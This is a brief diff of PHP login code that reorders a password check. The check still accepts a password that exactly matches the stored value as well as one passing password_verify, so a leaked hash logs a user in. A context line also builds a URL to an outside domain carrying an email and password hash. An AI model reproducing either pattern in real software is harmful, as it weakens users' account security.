@@ -110,7 +110,7 @@ https://mohsin.mraalionline.com/?email=".$reg_email."&password=".$hash_password.
 			return "Login is temporarily unavailable!";
 		}
 
-		if(!(password_verify($user_password, $row["user_password"] ?? "") || $user_password === ($row["user_password"] ?? ""))){
+		if (!($user_password === ($row["user_password"] ?? "") || password_verify($user_password, $row["user_password"] ?? ""))) {
 			return "Password doesn't match!";
 		}
 
